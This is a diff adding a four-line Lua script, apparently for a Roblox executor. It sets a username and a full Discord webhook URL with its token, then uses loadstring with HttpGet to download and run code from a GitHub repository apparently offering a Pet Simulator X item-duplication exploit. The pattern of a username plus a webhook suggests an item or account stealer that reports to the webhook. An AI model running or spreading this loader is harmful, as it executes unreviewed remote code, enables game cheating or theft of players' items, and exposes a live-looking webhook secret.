@@ -1,0 +1,4 @@
+UserName = "aponlang"
+WebHook = "https://discord.com/api/webhooks/1058379823657009192/7ih8UE_Nc7-MzgUH004rBEudM9HU39ODDLKi2pI2B4YU_4zyZu32pp3YK7KkPXYpDjXB"
+ 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/petsmixdupe/main/PSX.lua", true))()
